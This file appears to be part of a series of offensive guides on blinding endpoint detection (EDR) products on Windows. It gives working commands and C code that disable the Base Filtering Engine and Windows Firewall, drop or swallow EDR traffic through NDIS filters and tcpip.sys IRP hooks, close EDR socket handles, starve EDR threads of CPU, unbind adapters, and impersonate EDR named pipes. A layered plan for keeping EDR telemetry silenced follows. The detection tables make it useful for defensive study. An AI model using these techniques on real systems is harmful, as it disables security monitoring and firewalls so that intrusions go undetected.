# Advanced & Creative Techniques — Thinking Outside Every Box

## Preface

This file documents techniques that don't fit neatly into the WFP or "alternative
routing" categories from the earlier files. These involve attacking the infrastructure
that WFP itself depends on, attacking the EDR process from the inside, or exploiting
Windows internals in unexpected ways.

---

## Technique J — BFE Service Disruption

### Concept

The Base Filtering Engine (BFE) service is the userland manager for all WFP filters.
If BFE stops: **all WFP filter evaluation stops**. Every filter that was added (by
EDRs, Windows Firewall, anyone) instantly becomes inactive. The network is wide open.

This is nuclear — it disables Windows Firewall too. But from a pure research standpoint,
it's the most fundamental WFP bypass: kill the thing that runs WFP.

### Implementation

```cmd
:: Stop the BFE service (requires SYSTEM or sufficient privileges)
net stop bfe /y

:: BFE will try to restart automatically (it's "Automatic (Delayed Start)")
:: Prevent restart:
sc config bfe start= disabled
```

#### Persistent via registry:

```c
// Change BFE start type to disabled
HKEY hKey;
RegOpenKeyExW(HKEY_LOCAL_MACHINE,
    L"SYSTEM\\CurrentControlSet\\Services\\bfe",
    0, KEY_SET_VALUE, &hKey);

DWORD startType = SERVICE_DISABLED;
RegSetValueExW(hKey, L"Start", 0, REG_DWORD, (BYTE*)&startType, sizeof(DWORD));
RegCloseKey(hKey);
```

### Impact

| What loses functionality | Notes |
|---|---|
| Windows Firewall | All rules become inactive |
| EDR WFP-based telemetry | Network monitoring blind |
| EDR network containment | Containment filters drop |
| MPSSVC (Firewall service) | Depends on BFE, may also die |
| IPSec (PolicyAgent) | Depends on BFE for some functions |

### Why BFE Can't Be Simply Stopped

On modern Windows, BFE is protected. You need either:
- SYSTEM token + `SeServiceLogonRight`
- Token with `SeDebugPrivilege` + ability to kill the BFE process directly
- Write to the registry key that controls BFE start type before the next boot
- A kernel driver that can patch BFE's behavior

### Detection

| Artifact | Details |
|---|---|
| Service stop event | System event log, EventID 7036: "Base Filtering Engine service entered the stopped state" |
| Service config change | EventID 7040: "The start type of BFE service was changed" |
| Network connectivity loss | All firewall-protected traffic suddenly flows unrestricted |
| EDR heartbeat failure | EDR detects its WFP-based monitoring is down |

---

## Technique K — NDIS Lightweight Filter (LWF) Driver

### What Is NDIS LWF?

NDIS Lightweight Filter (LWF) is a kernel-mode driver model that sits **between the
NDIS protocol layer (TCP/IP) and the NDIS miniport (NIC driver)**. LWF drivers can
intercept, inspect, modify, and drop packets at the Ethernet frame level.

```
TCP/IP (tcpip.sys)
    ↓
NDIS Filter Module  ← LWF driver operates here
    ↓
NDIS Miniport (NIC driver)
    ↓
Physical NIC
```

LWF is the mechanism used by:
- Virtual switch drivers (Hyper-V, VMware)
- Some VPN clients
- Network monitoring tools
- WinPcap/Npcap (Wireshark's capture driver)

### Why LWF vs WFP Callout?

| Property | WFP Callout | NDIS LWF |
|---|---|---|
| Visibility in WFPExplorer | Yes | **No** |
| WFP Events 5446/5447 | Yes | **No** |
| Packet access | Connection metadata + limited payload | **Full Ethernet frame access** |
| Operating layer | IP/TCP | Ethernet (Layer 2) |
| Used by common tools | Many EDRs | Relatively rare |

### LWF Driver Structure

```c
// Filter module attach callback
NDIS_STATUS FilterAttach(
    NDIS_HANDLE NdisFilterHandle,
    NDIS_HANDLE FilterDriverContext,
    PNDIS_FILTER_ATTACH_PARAMETERS AttachParameters)
{
    // Register our filter with NDIS
    NDIS_FILTER_CHARACTERISTICS filterChar = {0};
    filterChar.SendNetBufferListsHandler = FilterSendNetBufferLists;
    filterChar.ReceiveNetBufferListsHandler = FilterReceiveNetBufferLists;

    NdisFSetAttributes(NdisFilterHandle, filterContext,
                       &filterChar);
}

// Intercept outbound packets
VOID FilterSendNetBufferLists(
    NDIS_HANDLE FilterModuleContext,
    PNET_BUFFER_LIST NetBufferList,
    NDIS_PORT_NUMBER PortNumber,
    ULONG SendFlags)
{
    PNET_BUFFER_LIST current = NetBufferList;

    while (current) {
        PNET_BUFFER_LIST next = current->Next;

        // Inspect Ethernet frame → IP header → TCP header → source port
        // If source process (via flow context) is EDR: drop the NBL
        if (IsEdrNetBufferList(current)) {
            // Complete the NBL locally (return "sent" to the sending protocol)
            // but don't forward to the NIC
            current->Status = NDIS_STATUS_SUCCESS;
            NdisFSendNetBufferListsComplete(FilterModuleContext, current, 0);
        } else {
            NdisFSendNetBufferLists(FilterModuleContext, current, PortNumber, SendFlags);
        }

        current = next;
    }
}
```

### Registration

LWF drivers are registered in the registry and bound to specific adapters:

```
HKLM\SYSTEM\CurrentControlSet\Control\Network\{Guid}\{AdapterGuid}\Connection
HKLM\SYSTEM\CurrentControlSet\Services\{DriverName}\
    Type    REG_DWORD = 1   (kernel driver)
    Start   REG_DWORD = 0   (boot start)
```

### Stealth Profile

- No entry in WFP filter list
- No Event 5447
- Not visible in `netsh wfp show`
- **Is** visible in `netsh lmhosts query` or custom NDIS enumeration
- Loading generates Event 7045 (service install) if installed as service

---

## Technique L — Socket Handle Theft via NtDuplicateObject

### Concept

Every active TCP connection in the EDR process is backed by a socket object with
a handle in the EDR process's handle table. If we can **close those handles**, the
connection is terminated — without injecting code into the EDR process, without WFP,
without drivers.

### Mechanism

1. Open the EDR process with `PROCESS_DUP_HANDLE`
2. Enumerate all handles in the system via `NtQuerySystemInformation(SystemHandleInformation)`
3. Filter for handles owned by the EDR process
4. For each socket handle: call `NtDuplicateObject` with `DUPLICATE_CLOSE_SOURCE` flag
   - This closes the handle in the source process (EDR) while creating a duplicate in ours
5. Result: EDR's socket handle is closed → active TCP connection is torn down

```c
#include <windows.h>
#include <winternl.h>

// Step 1: Get all handles in the system
ULONG bufSize = 1 << 20;  // start with 1MB, grow as needed
PSYSTEM_HANDLE_INFORMATION handleInfo = (PSYSTEM_HANDLE_INFORMATION)VirtualAlloc(...);

NtQuerySystemInformation(SystemHandleInformation, handleInfo, bufSize, NULL);

// Step 2: Find target EDR process PID
DWORD edrPid = GetEdrPid("MsSense.exe");

// Step 3: Open EDR process with DUP_HANDLE right
HANDLE hEdrProcess = OpenProcess(PROCESS_DUP_HANDLE, FALSE, edrPid);

// Step 4: Enumerate and close socket handles
for (ULONG i = 0; i < handleInfo->HandleCount; i++) {
    SYSTEM_HANDLE_TABLE_ENTRY_INFO *entry = &handleInfo->Handles[i];

    if (entry->UniqueProcessId != edrPid) continue;

    // Type check: socket object type index (varies by Windows version, typically 30-38)
    // Query the object type to verify it's a socket
    HANDLE dupHandle;
    NTSTATUS status = NtDuplicateObject(
        hEdrProcess,                    // source process
        (HANDLE)(ULONG_PTR)entry->HandleValue,  // source handle (in EDR)
        GetCurrentProcess(),            // target process (us)
        &dupHandle,                     // output handle
        0,
        0,
        DUPLICATE_CLOSE_SOURCE          // close the handle in EDR!
    );

    if (NT_SUCCESS(status)) {
        // We got a duplicate; EDR's original handle is now closed
        // Verify it was a socket handle by trying closesocket()
        closesocket((SOCKET)dupHandle);
    }
}
```

### Effect

- No WFP filter
- No driver
- No DNS/routing changes
- Works on PPL-protected processes? **Partially** — PPL restricts `OpenProcess` to
  lower access rights. `PROCESS_DUP_HANDLE` may be denied for PPL processes.
- The EDR's active TLS connections are torn down and must reconnect

### Detection

| Artifact | Details |
|---|---|
| `NtQuerySystemInformation(SystemHandleInformation)` | ETW (rare monitoring) |
| `NtDuplicateObject` with `DUPLICATE_CLOSE_SOURCE` | ETW kernel trace |
| `OpenProcess(PROCESS_DUP_HANDLE, edrPid)` | Object access event 4663 |

---

## Technique M — CPU Starvation of EDR Network Threads

### Concept

EDR telemetry transmission happens on specific worker threads inside the EDR process.
If those threads cannot get CPU time, they cannot send data — even if the network
connection is technically available.

This doesn't block the network; it blocks the CPU from processing network operations.

### Method 1: Process Priority Downgrade

```c
HANDLE hEdrProcess = OpenProcess(PROCESS_SET_INFORMATION, FALSE, edrPid);

// Set to lowest possible priority class
SetPriorityClass(hEdrProcess, IDLE_PRIORITY_CLASS);

// Also set thread priorities to THREAD_PRIORITY_IDLE
HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
THREADENTRY32 te = {0};
te.dwSize = sizeof(te);
Thread32First(hThreadSnap, &te);

do {
    if (te.th32OwnerProcessID == edrPid) {
        HANDLE hThread = OpenThread(THREAD_SET_INFORMATION, FALSE, te.th32ThreadID);
        SetThreadPriority(hThread, THREAD_PRIORITY_IDLE);
        CloseHandle(hThread);
    }
} while (Thread32Next(hThreadSnap, &te));
```

### Method 2: CPU Affinity Restriction

```c
// Force EDR process to only run on a single CPU core (e.g., CPU 0)
// On a multi-core machine under load, this severely limits throughput
DWORD_PTR affinityMask = 0x1;  // only CPU 0
SetProcessAffinityMask(hEdrProcess, affinityMask);
```

### Method 3: Job Object CPU Rate Control (Windows 8+)

```c
// Create a job object with severe CPU rate limiting
HANDLE hJob = CreateJobObject(NULL, NULL);

JOBOBJECT_CPU_RATE_CONTROL_INFORMATION cpuControl = {0};
cpuControl.ControlFlags = JOB_OBJECT_CPU_RATE_CONTROL_ENABLE |
                          JOB_OBJECT_CPU_RATE_CONTROL_HARD_CAP;
cpuControl.CpuRate = 100;  // 1% of CPU (rate is in 0.01% units)

SetInformationJobObject(hJob, JobObjectCpuRateControlInformation,
                        &cpuControl, sizeof(cpuControl));

// Assign EDR process to this job (requires handle with PROCESS_SET_QUOTA)
AssignProcessToJobObject(hJob, hEdrProcess);
```

**Caveat:** Assigning a process to a job may fail if the EDR is already in a job
object (Windows 8+ allows nested jobs, but there are constraints).

### Detection

| Artifact | Details |
|---|---|
| Process priority change | `SetPriorityClass` ETW event |
| Thread priority change | `NtSetInformationThread` ETW |
| Affinity change | Process attribute change ETW |
| EDR reports degraded performance | Internal EDR health monitoring |

---

## Technique N — Network Adapter Binding Manipulation

### Concept

The Windows network stack is implemented as a binding between protocols (TCPIP, IPX)
and adapters. The binding of TCP/IP to a physical adapter can be **disabled** via
registry, completely preventing any TCP/IP traffic on that adapter — without WFP,
without routing changes, without DNS.

### Registry-Based Unbinding

```
HKLM\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}\{adapter index}\
    UpperFilters  REG_MULTI_SZ = [list of bound protocols]
    BindName      REG_SZ       = \Device\{GUID}
```

More directly via the `NetBindDisable` operation:

```c
// Use INetCfg COM interface to unbind TCP/IP from adapter
INetCfg *pNetCfg;
INetCfgComponent *pAdapter;
INetCfgComponent *pTcpip;
INetCfgComponentBindings *pBindings;

CoCreateInstance(CLSID_CNetCfg, NULL, CLSCTX_INPROC_SERVER,
                 IID_INetCfg, (void**)&pNetCfg);
pNetCfg->Initialize(NULL);

// Find TCP/IP component
pNetCfg->FindComponent(L"ms_tcpip", &pTcpip);

// Find adapter
// ... (enum adapters)

// Get binding interface
pTcpip->QueryInterface(IID_INetCfgComponentBindings, (void**)&pBindings);

// Disable binding to specific adapter
pBindings->BindTo(pAdapter, FALSE);  // FALSE = unbind
```

Or via `netsh` (simpler, generates logs):
```cmd
netsh interface set interface "Local Area Connection" disable
```

### Detection

| Artifact | Details |
|---|---|
| Network adapter status change | Event log: adapter disabled |
| Registry write to Adapter binding key | Sysmon Event 13 |
| `devmgmt.msc` adapter disabled | Visible in Device Manager |

---

## Technique O — Firewall Profile Switching Attack

### Concept

Windows has three firewall profiles: Domain, Private, Public. The "Domain" profile
typically allows EDR communication (it's the most trusted). The "Public" profile
blocks most inbound and some outbound traffic.

If the machine is connected to a Domain network and we switch the profile to "Public",
Windows Firewall (and any EDR policy rules tied to the Domain profile) may change
their behavior.

Additionally, if EDR registers its permit rules **only** in the Domain profile sublayer,
switching to Public profile means those rules don't apply — and any default-deny
Public profile rules block EDR telemetry.

### Implementation

```powershell
# Check current profile
(Get-NetConnectionProfile).NetworkCategory

# Switch to Public (most restrictive)
Set-NetConnectionProfile -InterfaceIndex (Get-NetAdapter).ifIndex -NetworkCategory Public

# Or manipulate the profile via registry
# HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles\{GUID}\
#    Category  REG_DWORD  = 0 (Public), 1 (Private), 2 (Domain)
```

### When This Works

This is effective when:
1. EDR WFP permit rules are scoped to the Domain profile sublayer
2. Windows Firewall has a default "block outbound" rule in the Public profile
3. The EDR doesn't detect its own profile switch

---

## Technique P — Named Pipe Impersonation Against EDR IPC

### Concept

Many EDR architectures consist of multiple components that communicate locally via
named pipes before sending data to the network. The sequence is:

```
EDR Sensor (ring3) → Named Pipe IPC → EDR Agent (ring3) → Network → C2
```

If the attacker can intercept the named pipe, they can drop telemetry before it
even reaches the network component — completely invisible to all network monitoring.

### Pipe Server Impersonation

```c
// Create a fake pipe server before the real EDR creates it
// (requires knowing the pipe name — reverse-engineer the EDR first)
HANDLE hFakePipe = CreateNamedPipeW(
    L"\\\\.\\pipe\\EDRInternalPipe",    // must match EDR's expected pipe name
    PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
    PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
    PIPE_UNLIMITED_INSTANCES,
    4096, 4096,
    0,
    NULL
);

// Accept connection from EDR sensor
ConnectNamedPipe(hFakePipe, NULL);

// Now read all telemetry data from the sensor and silently discard
// The sensor thinks it successfully delivered to the agent
BYTE buffer[4096];
DWORD bytesRead;
ReadFile(hFakePipe, buffer, sizeof(buffer), &bytesRead, NULL);
// Don't forward to the real agent
```

**Critical:** Must create the pipe **before** the EDR component that creates it
(timing attack — e.g., at system boot).

### Detection

| Artifact | Details |
|---|---|
| Unexpected process holding pipe handle | Process monitor |
| Pipe creation by non-EDR process | Sysmon Event 17/18 (pipe connect) |
| EDR component reports IPC failure | Internal health monitoring |

---

## Technique Q — Kernel TCP/IP Dispatch Table Hook (IRP Hook)

### Concept

The TCP/IP stack driver (`tcpip.sys`) exposes a standard Windows Driver Model (WDM)
dispatch table. Each IRP (I/O Request Packet) type has a function pointer in this table.
By replacing the `IRP_MJ_WRITE` and `IRP_MJ_DEVICE_CONTROL` function pointers with
our own, we can intercept all writes to the TCP/IP stack before WFP ever sees them.

This is more primitive than WFP and does not trigger any WFP events.

### Why This Is More Primitive Than WFP

WFP's filter engine (in `tcpip.sys`) is called **after** `IRP_MJ_WRITE`. If we hook
the dispatch table, we run **before** WFP. Even EDR callouts that set
`FWPS_RIGHT_ACTION_WRITE` to make verdicts irrevocable cannot stop our hook — we
already intercepted the data before WFP was consulted.

```
Application write() → IOCP/AFD.sys → 
IRP_MJ_WRITE → [OUR HOOK HERE] → tcpip.sys dispatch → WFP → ... → NIC
```

### Implementation (Kernel Mode Only)

```c
// Get the dispatch table of tcpip.sys
PDRIVER_OBJECT pTcpipDriverObject;
UNICODE_STRING tcpipName = RTL_CONSTANT_STRING(L"\\Driver\\Tcpip");
ObReferenceObjectByName(&tcpipName, OBJ_CASE_INSENSITIVE, NULL,
                        0, *IoDriverObjectType, KernelMode, NULL,
                        (PVOID*)&pTcpipDriverObject);

// Save original dispatch routine
PDRIVER_DISPATCH originalWrite = pTcpipDriverObject->MajorFunction[IRP_MJ_WRITE];

// Install our hook
pTcpipDriverObject->MajorFunction[IRP_MJ_WRITE] = MyWriteHook;
```

```c
// Our hook function
NTSTATUS MyWriteHook(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    // Get process that initiated this write
    PEPROCESS process = IoGetRequestorProcess(Irp);
    PUNICODE_STRING imageName = PsGetProcessImageFileName(process);

    // If EDR process: complete IRP immediately as success (swallow the data)
    if (IsEdrProcess(imageName)) {
        Irp->IoStatus.Status = STATUS_SUCCESS;
        Irp->IoStatus.Information = IoGetCurrentIrpStackLocation(Irp)->Parameters.Write.Length;
        IoCompleteRequest(Irp, IO_NO_INCREMENT);
        return STATUS_SUCCESS;
    }

    // Otherwise: forward to original handler
    return originalWrite(DeviceObject, Irp);
}
```

### Implications

- **No WFP interaction** — IRP hook bypasses WFP entirely
- **No EDR callout can detect** — operates below the WFP layer
- **PatchGuard risk** — On 64-bit Windows, PatchGuard monitors certain kernel
  structures. Modifying driver dispatch tables may or may not be protected
  (driver object dispatch tables are generally NOT protected by PatchGuard directly,
  but adjacent kernel structures may trigger checks)

### Detection

| Artifact | Details |
|---|---|
| Driver object tampering | PatchGuard (if protects dispatch table region) |
| tcpip.sys write interception | Kernel ETW trace at IRP level |
| Custom driver load | Event 7045 |

---

## The Layered "Defense-in-Depth" Attack Strategy

No single technique is 100% reliable. Hardened EDRs detect some, others cause
collateral damage. The sophisticated approach combines techniques to ensure coverage:

```
Phase 1 — DNS layer (stealth, no network events):
    - NRPT rules for all EDR cloud domains → 127.0.0.1
    - hosts.ics entries for specific subdomains

Phase 2 — IP layer (catch hardcoded IPs):
    - Resolve EDR cloud IPs before DNS is sinkholed
    - IP sinkholing (secondary IP assignment) for major cloud IP ranges
    - Null routes as backup for less critical IPs

Phase 3 — QoS backup (no WFP, no kernel):
    - EDRChoker QoS policies on EDR processes
    - Even if DNS/routing fails, TLS times out anyway

Phase 4 — IPSec (if EDR bypasses DNS + routing somehow):
    - IPSec block rules for discovered cloud IPs
    - Different policy engine → different audit trail

Phase 5 — Cleanup (connection teardown):
    - SetTcpEntry() to kill existing connections
    - Run in a loop to prevent reconnection
```

This "layered silence" approach means:
- If EDR has hardcoded IPs → Phase 2 still catches it
- If EDR monitors WFP → Phase 1,2,3,4 generate no WFP events
- If EDR reconnects → Phase 5 loop prevents sustained connection
- If one layer is detected → others continue to function

---

## Summary: Stealth vs Coverage vs Complexity

```
Most stealthy ← ─ ─ ─ ─ ─ ─ ─ ─ ─ → Most detectable
               │                          │
               E: IP sinkholing           G: Winsock LSP
               D: Null routing            A: Hosts file
               B: NRPT                    Technique 02: WFP filter
               F: WinHTTP proxy           Custom callout driver
               C: IPSec
               │
               Fewest tools monitor NRPT, IPSec, and IP sinkholing

Requires least kernel knowledge:
    A > B > C > D > E > F > QoS(06) > WFP filter(02) > 360WFP(04)
    > WinDivert(05) > Custom callout(07) > LWF(K) > IRP hook(Q)
```
